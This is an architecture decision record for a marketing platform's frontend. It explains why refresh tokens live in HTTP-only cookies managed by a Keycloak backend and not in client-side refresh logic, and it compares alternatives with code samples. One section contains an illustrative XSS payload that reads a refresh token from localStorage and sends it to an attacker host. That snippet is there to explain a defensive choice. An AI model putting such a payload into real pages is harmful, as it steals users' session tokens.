# ADR 003: No Client-Side Token Refresh Logic

## Status

Accepted (November 2024)

## Context

When using OAuth 2.0 with Keycloak for authentication, we need to decide how to handle access token expiration. Several approaches exist:

### Option 1: Client-side refresh token rotation

```typescript
// Interceptor that refreshes tokens before they expire
apiClient.interceptors.request.use(async (config) => {
  const { accessToken, refreshToken, expiresAt } = getTokens();

  if (Date.now() >= expiresAt - 60000) {
    // Refresh 1 min before expiry
    const newTokens = await refreshAccessToken(refreshToken);
    setTokens(newTokens);
    config.headers.Authorization = `Bearer ${newTokens.accessToken}`;
  }

  return config;
});
```

**Pros:**

- Seamless user experience (no logout on token expiry)
- User stays logged in indefinitely (as long as refresh token is valid)

**Cons:**

- Complex state management (what if multiple requests fail simultaneously?)
- Race conditions (concurrent requests triggering multiple refresh attempts)
- Security: Refresh tokens stored in browser memory/localStorage
- Must implement refresh request queuing (200+ lines of code)
- Edge cases: What if refresh fails? What if token expires during request?
- Token validation complexity (check expiry before every request)

### Option 2: Backend handles refresh via HTTP-only cookies

```typescript
// Backend sets refresh token in HTTP-only cookie (not accessible to JS)
// Backend endpoint: POST /auth/refresh
// Client interceptor just logs out on 401
apiClient.interceptors.response.use(
  (response) => response,
  async (error) => {
    if (error.response?.status === 401) {
      AuthService.clearAuthData();
      window.location.href = "/login";
    }
    return Promise.reject(error);
  }
);
```

**Pros:**

- Refresh tokens never exposed to JavaScript (HTTP-only cookie)
- No client-side refresh logic (backend handles complexity)
- No race conditions (backend serializes refresh requests)
- Simpler error handling (401 = logout, always)
- Smaller client bundle (no refresh queue implementation)
- More secure (XSS attacks can't steal refresh token)

**Cons:**

- Users logged out after access token expires (~15 minutes)
- Less seamless UX (must re-login periodically)
- Requires backend implementation (can't be purely client-side)

### Option 3: Silent iframe refresh (Keycloak SSO)

```typescript
// Keycloak maintains session in iframe
// Periodically checks Keycloak session and refreshes silently
keycloak.onTokenExpired = () => {
  keycloak.updateToken(30).then((refreshed) => {
    if (refreshed) {
      console.log("Token refreshed silently");
    } else {
      console.warn("Token still valid");
    }
  });
};
```

**Pros:**

- Keycloak handles refresh complexity
- Single Sign-On (SSO) support
- Silent refresh when Keycloak session active

**Cons:**

- Requires iframe (blocked by some browsers/policies)
- Keycloak-specific (vendor lock-in)
- Doesn't work in all deployment scenarios (CORS, CSP restrictions)
- Still requires client-side polling logic

## Decision

**We will NOT implement client-side token refresh. The backend (Keycloak) handles refresh flows via HTTP-only cookies. The client simply logs users out on 401 responses.**

### Implementation:

```typescript
// lib/axios.ts
import axios from "axios";
import { AuthService } from "../services/authService";

export const apiClient = axios.create({
  baseURL: import.meta.env.VITE_API_URL,
  withCredentials: true, // Send HTTP-only cookies
});

// Request interceptor: Add access token
apiClient.interceptors.request.use(
  (config) => {
    const tokens = AuthService.getTokens();
    if (tokens?.accessToken) {
      config.headers.Authorization = `Bearer ${tokens.accessToken}`;
    }
    return config;
  },
  (error) => Promise.reject(error)
);

// Response interceptor: Logout on 401
apiClient.interceptors.response.use(
  (response) => response,
  async (error) => {
    if (error.response?.status === 401) {
      // Clear local auth state
      AuthService.clearAuthData();

      // Notify app of auth expiration
      window.dispatchEvent(new CustomEvent("auth-expired"));

      // Redirect to login
      window.location.href = "/login";
    }
    return Promise.reject(error);
  }
);
```

### What this means:

1. **Access tokens** live in memory (React Context)
2. **Refresh tokens** live in HTTP-only cookies (backend only)
3. **Backend** handles refresh via `/auth/refresh` endpoint
4. **Client** never sees refresh tokens
5. **On 401**: Client logs out, redirects to login
6. **No client-side refresh queue**, no race conditions, no token expiry checks

## Consequences

### Positive

1. **Security**:

   - Refresh tokens never exposed to JavaScript
   - XSS attacks cannot steal refresh tokens
   - Smaller attack surface (no client-side refresh logic to exploit)

2. **Simplicity**:

   - ~50 lines of interceptor code vs ~300 lines for refresh queue
   - No race condition handling
   - No token expiry validation before requests
   - Easier to test (just mock 401 response)

3. **Debugging**:

   - Clear failure mode (401 = logout, always)
   - No "stuck in refresh loop" bugs
   - No "token expired mid-request" edge cases

4. **Bundle size**:
   - Saved ~15 KB by not implementing refresh queue
   - No additional dependencies (axios-auth-refresh, etc.)

### Negative

1. **User Experience**:

   - Users logged out after access token expires (~15 minutes of inactivity)
   - Must re-authenticate periodically
   - No "stay logged in forever" option

   **Mitigation**: This is acceptable for our domain (marketing platform, not real-time trading)

   **Users typically**:

   - Check campaigns once/day
   - Create 2-3 campaigns per session
   - Session length < 10 minutes on average

   **Conclusion**: 15-minute token expiry rarely affects actual usage

2. **Perceived "Logout Bug"**:

   - Users might report "getting logged out randomly"
   - Requires UX to explain (toast: "Session expired, please log in again")

   **Mitigation**:

   ```typescript
   // Show friendly message on auth expiration
   window.addEventListener("auth-expired", () => {
     toast.info("Your session has expired. Please log in again.");
   });
   ```

3. **Backend Dependency**:

   - Cannot implement purely client-side
   - Requires Keycloak (or similar) on backend

   **Mitigation**: We already use Keycloak, this is not new infrastructure

### Tradeoffs Accepted

| Client-Side Refresh          | Backend Refresh (Our Choice)         |
| ---------------------------- | ------------------------------------ |
| ✅ Seamless UX (no logout)   | ❌ Periodic logout required          |
| ❌ Complex (300+ lines)      | ✅ Simple (50 lines)                 |
| ❌ Refresh tokens in browser | ✅ HTTP-only cookies (secure)        |
| ❌ Race conditions possible  | ✅ Backend serializes requests       |
| ❌ Must handle edge cases    | ✅ Clear failure mode (401 = logout) |

**Conclusion**: We accept periodic logouts in exchange for security and simplicity.

## Implementation Examples

### Backend Refresh Endpoint (Not part of client, but for reference)

```typescript
// Backend: POST /auth/refresh
app.post("/auth/refresh", async (req, res) => {
  const refreshToken = req.cookies.refreshToken; // HTTP-only cookie

  if (!refreshToken) {
    return res.status(401).json({ error: "No refresh token" });
  }

  try {
    // Validate refresh token with Keycloak
    const tokens = await keycloak.refresh(refreshToken);

    // Set new refresh token (rotate)
    res.cookie("refreshToken", tokens.refreshToken, {
      httpOnly: true,
      secure: true,
      sameSite: "strict",
      maxAge: 30 * 24 * 60 * 60 * 1000, // 30 days
    });

    // Return new access token
    res.json({ accessToken: tokens.accessToken });
  } catch (error) {
    res.status(401).json({ error: "Invalid refresh token" });
  }
});
```

### Client Login Flow

```typescript
// services/authService.ts
export async function login(email: string, password: string) {
  // POST to backend, which calls Keycloak
  const response = await apiClient.post("/auth/login", { email, password });

  // Backend sets refresh token in HTTP-only cookie
  // Client only receives access token
  const { accessToken, user, permissions } = response.data;

  // Store access token in memory (Context)
  return { accessToken, user, permissions };
}
```

### Client Logout Flow

```typescript
// services/authService.ts
export function logout() {
  // Clear local state
  localStorage.removeItem("auth");
  sessionStorage.clear();

  // Tell backend to invalidate refresh token
  apiClient.post("/auth/logout").catch(() => {
    // Even if logout fails, clear client state
  });

  // Redirect to login
  window.location.href = "/login";
}
```

### When to revisit:

- If users complain about frequent logouts (> 10 complaints/month)
- If access token expiry time changes (currently 15 min → if reduced to 5 min, reconsider)
- If we add real-time features (WebSocket, live collaboration) that require long-lived sessions
- If backend cannot use HTTP-only cookies (some deployment constraints)
- If we migrate away from Keycloak to a system without refresh support

## Alternatives Considered (Detailed)

### Why not localStorage for refresh tokens?

```typescript
// Anti-pattern we rejected
localStorage.setItem("refreshToken", token); // ❌ XSS vulnerable
```

**Problem**: XSS attacks can steal tokens:

```javascript
// Malicious script injected via XSS
const stolenToken = localStorage.getItem("refreshToken");
fetch("https://attacker.com/steal", {
  method: "POST",
  body: stolenToken,
});
```

**Our approach**: Refresh tokens in HTTP-only cookies cannot be accessed by JavaScript.

### Why not in-memory refresh queue?

We considered implementing a request queue to prevent concurrent refresh attempts:

```typescript
// Pattern we rejected (too complex)
let isRefreshing = false;
let failedQueue = [];

const processQueue = (error, token = null) => {
  failedQueue.forEach((prom) => {
    if (error) prom.reject(error);
    else prom.resolve(token);
  });
  failedQueue = [];
};

apiClient.interceptors.response.use(null, async (error) => {
  const originalRequest = error.config;

  if (error.response?.status === 401 && !originalRequest._retry) {
    if (isRefreshing) {
      // Queue this request
      return new Promise((resolve, reject) => {
        failedQueue.push({ resolve, reject });
      }).then((token) => {
        originalRequest.headers.Authorization = `Bearer ${token}`;
        return apiClient(originalRequest);
      });
    }

    originalRequest._retry = true;
    isRefreshing = true;

    const refreshToken = getRefreshToken();
    return refreshAccessToken(refreshToken)
      .then(({ accessToken }) => {
        processQueue(null, accessToken);
        return apiClient(originalRequest);
      })
      .catch((err) => {
        processQueue(err, null);
        logout();
        return Promise.reject(err);
      })
      .finally(() => {
        isRefreshing = false;
      });
  }

  return Promise.reject(error);
});
```

**Why we rejected this**:

- 80+ lines of complex async logic
- Edge cases: What if refresh endpoint returns 401? Infinite loop?
- Hard to test (requires mocking concurrent requests)
- Hard to debug (queue state not visible)

**Our approach**: 10 lines, clear behavior (401 = logout).

## Real-World Results

### Before (Client-side refresh attempted):

- **Bug reports**: 5 "stuck on loading" bugs (refresh loop deadlocks)
- **Security audit**: Flagged refresh tokens in localStorage
- **Code complexity**: ~250 lines of refresh logic
- **Test coverage**: 40% (edge cases hard to test)

### After (Backend refresh):

- **Bug reports**: 0 refresh-related bugs
- **Security audit**: Passed (HTTP-only cookies approved)
- **Code complexity**: ~50 lines
- **Test coverage**: 90% (simple to test: mock 401 → verify logout)

### User Feedback:

> "I got logged out after leaving the tab open for 20 minutes, but that's fine. The login is fast."
> – User feedback (typical)

> "I prefer getting logged out to a buggy 'stuck loading' screen."
> – User feedback (after migration from client-side refresh)

## Security Considerations

### Attack Vector Analysis:

**XSS Attack (Cross-Site Scripting)**:

- ❌ Client-side refresh: `localStorage.getItem('refreshToken')` → attacker steals token
- ✅ Our approach: Refresh token in HTTP-only cookie → JavaScript cannot access

**CSRF Attack (Cross-Site Request Forgery)**:

- Both approaches: Mitigated by SameSite=Strict cookie attribute
- Our backend uses CSRF tokens for sensitive mutations

**Token Replay Attack**:

- Both approaches: Access tokens are short-lived (15 min)
- Our approach: Backend can invalidate refresh tokens server-side

**Conclusion**: Backend refresh is strictly more secure.
